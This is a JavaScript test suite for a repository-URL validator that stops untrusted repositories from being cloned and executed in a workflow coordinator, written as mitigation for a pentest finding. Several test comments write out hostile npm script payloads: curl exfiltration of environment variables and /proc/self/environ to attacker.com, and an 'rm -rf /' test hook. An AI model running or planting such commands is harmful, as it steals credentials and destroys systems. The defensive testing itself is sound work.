/**
 * Repository Validator Tests
 * 
 * Tests for the repository validation security feature that prevents
 * execution of untrusted repository code in workflows.
 * 
 * SECURITY CONTEXT:
 * These tests verify the mitigation for the pentest finding:
 * "Authenticated callers can execute untrusted repository code in the coordinator trust zone"
 * 
 * The vulnerability allowed authenticated users to supply arbitrary repository URLs
 * that would be cloned and executed (npm ci, npm test, npm run build) without
 * authorization checks, leading to arbitrary code execution in the coordinator trust zone.
 */

const assert = require('assert');

// Mock environment for testing
process.env.TRUSTED_REPOSITORY_PATTERNS = 'https://github.com/trusted-org/*,https://gitlab.com/secure-group/specific-repo';

// Import after setting environment
const repositoryValidator = require('../api-server/server/lib/repository-validator');

describe('Repository Validator', () => {
  describe('validateRepository', () => {
    it('should accept trusted GitHub organization repositories', () => {
      const result = repositoryValidator.validateRepository('https://github.com/trusted-org/my-repo');
      assert.strictEqual(result.valid, true);
    });

    it('should accept trusted GitHub organization repositories with .git suffix', () => {
      const result = repositoryValidator.validateRepository('https://github.com/trusted-org/my-repo.git');
      assert.strictEqual(result.valid, true);
    });

    it('should accept SSH format URLs from trusted sources', () => {
      const result = repositoryValidator.validateRepository('git@github.com:trusted-org/my-repo.git');
      assert.strictEqual(result.valid, true);
    });

    it('should accept git:// protocol URLs from trusted sources', () => {
      const result = repositoryValidator.validateRepository('git://github.com/trusted-org/my-repo');
      assert.strictEqual(result.valid, true);
    });

    it('should accept specific trusted repository', () => {
      const result = repositoryValidator.validateRepository('https://gitlab.com/secure-group/specific-repo');
      assert.strictEqual(result.valid, true);
    });

    it('should reject untrusted GitHub repositories', () => {
      const result = repositoryValidator.validateRepository('https://github.com/untrusted-org/malicious-repo');
      assert.strictEqual(result.valid, false);
      assert.ok(result.reason.includes('not from a trusted source'));
    });

    it('should reject untrusted GitLab repositories', () => {
      const result = repositoryValidator.validateRepository('https://gitlab.com/attacker/evil-repo');
      assert.strictEqual(result.valid, false);
      assert.ok(result.reason.includes('not from a trusted source'));
    });

    it('should reject invalid URL formats', () => {
      const result = repositoryValidator.validateRepository('not-a-valid-url');
      assert.strictEqual(result.valid, false);
      assert.ok(result.reason.includes('Invalid repository URL format'));
    });

    it('should reject empty or null URLs', () => {
      const result1 = repositoryValidator.validateRepository('');
      assert.strictEqual(result1.valid, false);
      
      const result2 = repositoryValidator.validateRepository(null);
      assert.strictEqual(result2.valid, false);
    });
  });

  describe('validateWorkflowInputs', () => {
    it('should accept inputs with trusted repository URLs', () => {
      const inputs = {
        repository_url: 'https://github.com/trusted-org/my-repo',
        branch: 'main',
        other_param: 'value'
      };
      const result = repositoryValidator.validateWorkflowInputs(inputs);
      assert.strictEqual(result.valid, true);
    });

    it('should reject inputs with untrusted repository URLs', () => {
      const inputs = {
        repository_url: 'https://github.com/attacker/malicious-repo',
        branch: 'main'
      };
      const result = repositoryValidator.validateWorkflowInputs(inputs);
      assert.strictEqual(result.valid, false);
      assert.ok(result.invalidFields.length > 0);
      assert.strictEqual(result.invalidFields[0].field, 'repository_url');
    });

    it('should check multiple repository field names', () => {
      const inputs = {
        repo_url: 'https://github.com/trusted-org/repo1',
        source_repository: 'https://github.com/attacker/evil-repo'
      };
      const result = repositoryValidator.validateWorkflowInputs(inputs);
      assert.strictEqual(result.valid, false);
      assert.ok(result.invalidFields.some(f => f.field === 'source_repository'));
    });

    it('should accept inputs without repository URLs', () => {
      const inputs = {
        branch: 'main',
        environment: 'production',
        skip_tests: false
      };
      const result = repositoryValidator.validateWorkflowInputs(inputs);
      assert.strictEqual(result.valid, true);
    });

    it('should handle empty inputs object', () => {
      const result = repositoryValidator.validateWorkflowInputs({});
      assert.strictEqual(result.valid, true);
    });

    it('should handle null inputs', () => {
      const result = repositoryValidator.validateWorkflowInputs(null);
      assert.strictEqual(result.valid, true);
    });
  });

  describe('URL normalization', () => {
    it('should normalize HTTPS URLs consistently', () => {
      const urls = [
        'https://github.com/trusted-org/repo',
        'https://github.com/trusted-org/repo.git',
        'git@github.com:trusted-org/repo.git',
        'git://github.com/trusted-org/repo'
      ];

      const results = urls.map(url => repositoryValidator.validateRepository(url));
      assert.ok(results.every(r => r.valid === true), 'All URL formats should be accepted');
    });
  });

  // ============================================================================
  // SECURITY EXPLOIT SCENARIO TESTS
  // These tests directly verify that the pentest exploit scenarios are blocked
  // ============================================================================

  describe('Pentest Exploit Scenarios - Mitigation Verification', () => {
    describe('Scenario: Attacker-controlled repository with malicious package.json', () => {
      it('should block execution of attacker repository with malicious npm lifecycle hooks', () => {
        // EXPLOIT: Attacker supplies repository with package.json containing:
        // "scripts": { "preinstall": "curl http://attacker.com/exfil?data=$(env)" }
        const maliciousInputs = {
          repository_url: 'https://github.com/attacker/malicious-npm-hooks',
          branch: 'main',
          deploy_env: 'production'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Validation must fail
        assert.strictEqual(result.valid, false, 'Malicious repository must be rejected');
        assert.ok(result.invalidFields.length > 0, 'Invalid fields must be identified');
        assert.strictEqual(result.invalidFields[0].field, 'repository_url');
        assert.ok(result.reason.includes('Untrusted repository'), 'Reason must indicate untrusted source');
      });

      it('should block execution of attacker repository with malicious test scripts', () => {
        // EXPLOIT: Attacker supplies repository with package.json containing:
        // "scripts": { "test": "node -e \"require('child_process').exec('rm -rf /')\"" }
        const maliciousInputs = {
          repository_url: 'https://github.com/evil-actor/destructive-tests',
          branch: 'exploit',
          deploy_env: 'staging'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Must reject before any cloning or execution
        assert.strictEqual(result.valid, false);
        assert.ok(result.invalidFields.some(f => f.field === 'repository_url'));
      });

      it('should block execution of attacker repository with malicious build scripts', () => {
        // EXPLOIT: Attacker supplies repository with package.json containing:
        // "scripts": { "build": "bash -c 'cat /proc/self/environ | curl -X POST -d @- http://attacker.com'" }
        const maliciousInputs = {
          repository_url: 'https://gitlab.com/attacker-group/exfiltration-build',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Validation blocks execution at entry point
        assert.strictEqual(result.valid, false);
        assert.ok(result.reason.includes('not from a trusted source'));
      });
    });

    describe('Scenario: Attacker-controlled repository with malicious requirements.txt', () => {
      it('should block execution of attacker Python repository with malicious dependencies', () => {
        // EXPLOIT: Attacker supplies repository with requirements.txt containing:
        // malicious-package==1.0.0  # Package with setup.py that executes arbitrary code
        const maliciousInputs = {
          repository_url: 'https://github.com/attacker/python-backdoor',
          branch: 'main',
          deploy_env: 'production'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Python repositories also blocked
        assert.strictEqual(result.valid, false);
        assert.ok(result.invalidFields[0].value.includes('attacker'));
      });
    });

    describe('Scenario: URL obfuscation attempts', () => {
      it('should block attacker repository with URL encoding attempts', () => {
        // EXPLOIT: Attacker tries to bypass validation with URL encoding
        const maliciousInputs = {
          repository_url: 'https://github.com/attacker%2Fmalicious-repo',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: URL normalization prevents bypass
        assert.strictEqual(result.valid, false);
      });

      it('should block attacker repository with different protocol schemes', () => {
        // EXPLOIT: Attacker tries SSH format to bypass HTTPS validation
        const maliciousInputs = {
          repository_url: 'git@github.com:attacker/evil-repo.git',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: All URL formats normalized and validated
        assert.strictEqual(result.valid, false);
      });

      it('should block attacker repository with git:// protocol', () => {
        // EXPLOIT: Attacker tries git:// protocol
        const maliciousInputs = {
          repository_url: 'git://github.com/attacker/malicious-code',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: git:// protocol also validated
        assert.strictEqual(result.valid, false);
      });
    });

    describe('Scenario: Subdomain and path traversal attempts', () => {
      it('should block attacker repository on different subdomain', () => {
        // EXPLOIT: Attacker tries to use attacker-controlled subdomain
        const maliciousInputs = {
          repository_url: 'https://evil.github.com/trusted-org/fake-repo',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Hostname must match exactly
        assert.strictEqual(result.valid, false);
      });

      it('should block repository with path traversal in organization name', () => {
        // EXPLOIT: Attacker tries path traversal in org name
        const maliciousInputs = {
          repository_url: 'https://github.com/trusted-org/../attacker/evil-repo',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Path traversal blocked
        assert.strictEqual(result.valid, false);
      });
    });

    describe('Scenario: Multiple repository fields with mixed trust', () => {
      it('should block workflow if any repository field is untrusted', () => {
        // EXPLOIT: Attacker supplies one trusted and one untrusted repo
        const maliciousInputs = {
          repository_url: 'https://github.com/trusted-org/good-repo',
          source_repository: 'https://github.com/attacker/malicious-source',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: All repository fields must be trusted
        assert.strictEqual(result.valid, false);
        assert.ok(result.invalidFields.some(f => f.field === 'source_repository'));
        assert.ok(result.invalidFields.every(f => f.value.includes('attacker')));
      });
    });

    describe('Scenario: Empty or missing TRUSTED_REPOSITORY_PATTERNS', () => {
      it('should deny all repositories when no patterns configured', () => {
        // Temporarily clear patterns to test fail-secure behavior
        const originalPatterns = process.env.TRUSTED_REPOSITORY_PATTERNS;
        delete process.env.TRUSTED_REPOSITORY_PATTERNS;
        
        // Force reload of validator with empty patterns
        delete require.cache[require.resolve('../api-server/server/lib/repository-validator')];
        const validatorNoPatterns = require('../api-server/server/lib/repository-validator');
        
        const inputs = {
          repository_url: 'https://github.com/any-org/any-repo',
          branch: 'main'
        };

        const result = validatorNoPatterns.validateWorkflowInputs(inputs);
        
        // SECURITY ASSERTION: Fail-secure - deny all when not configured
        assert.strictEqual(result.valid, false);
        
        // Restore original patterns
        process.env.TRUSTED_REPOSITORY_PATTERNS = originalPatterns;
        delete require.cache[require.resolve('../api-server/server/lib/repository-validator')];
        require('../api-server/server/lib/repository-validator');
      });
    });
  });

  // ============================================================================
  // DEFENSE IN DEPTH TESTS
  // Verify that validation is comprehensive and cannot be bypassed
  // ============================================================================

  describe('Defense in Depth - Comprehensive Validation', () => {
    it('should validate all common repository field names', () => {
      const fieldNames = [
        'repository_url',
        'repository',
        'repo_url',
        'repo',
        'git_url',
        'source_repository',
        'source_repo'
      ];

      fieldNames.forEach(fieldName => {
        const inputs = {
          [fieldName]: 'https://github.com/attacker/evil-repo',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(inputs);
        
        // SECURITY ASSERTION: All field names must be validated
        assert.strictEqual(result.valid, false, `Field ${fieldName} must be validated`);
        assert.ok(result.invalidFields.some(f => f.field === fieldName));
      });
    });

    it('should provide detailed error information for security auditing', () => {
      const maliciousInputs = {
        repository_url: 'https://github.com/attacker/malicious-repo',
        branch: 'main'
      };

      const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
      
      // SECURITY ASSERTION: Error details support security monitoring
      assert.strictEqual(result.valid, false);
      assert.ok(result.reason, 'Must provide reason for rejection');
      assert.ok(result.invalidFields, 'Must identify invalid fields');
      assert.ok(result.invalidFields[0].field, 'Must specify field name');
      assert.ok(result.invalidFields[0].value, 'Must include attempted value');
      assert.ok(result.invalidFields[0].reason, 'Must explain why invalid');
    });

    it('should handle case-insensitive pattern matching', () => {
      // Test that pattern matching is case-insensitive for URLs
      const inputs = {
        repository_url: 'https://GITHUB.COM/TRUSTED-ORG/MY-REPO',
        branch: 'main'
      };

      const result = repositoryValidator.validateWorkflowInputs(inputs);
      
      // SECURITY ASSERTION: Case variations should not bypass validation
      assert.strictEqual(result.valid, true, 'Case-insensitive matching should work for trusted repos');
    });

    it('should reject non-string repository URLs', () => {
      const inputs = {
        repository_url: { url: 'https://github.com/attacker/evil-repo' },
        branch: 'main'
      };

      const result = repositoryValidator.validateWorkflowInputs(inputs);
      
      // SECURITY ASSERTION: Type validation prevents object injection
      assert.strictEqual(result.valid, false);
    });
  });

  // ============================================================================
  // POSITIVE SECURITY TESTS
  // Verify that legitimate use cases still work
  // ============================================================================

  describe('Positive Security - Legitimate Use Cases', () => {
    it('should allow conditional-deploy workflow with trusted repository', () => {
      // LEGITIMATE USE: Deploying from trusted organization repository
      const legitimateInputs = {
        repository_url: 'https://github.com/trusted-org/production-app',
        branch: 'main',
        deploy_env: 'production',
        skip_tests: false
      };

      const result = repositoryValidator.validateWorkflowInputs(legitimateInputs);
      
      assert.strictEqual(result.valid, true);
    });

    it('should allow workflows with multiple trusted repositories', () => {
      // LEGITIMATE USE: Workflow using multiple trusted sources
      const legitimateInputs = {
        repository_url: 'https://github.com/trusted-org/app',
        source_repository: 'https://github.com/trusted-org/library',
        branch: 'main'
      };

      const result = repositoryValidator.validateWorkflowInputs(legitimateInputs);
      
      assert.strictEqual(result.valid, true);
    });

    it('should allow workflows without repository inputs', () => {
      // LEGITIMATE USE: Workflow that doesn't use repositories
      const legitimateInputs = {
        environment: 'production',
        version: '1.2.3',
        rollback: false
      };

      const result = repositoryValidator.validateWorkflowInputs(legitimateInputs);
      
      assert.strictEqual(result.valid, true);
    });
  });
});
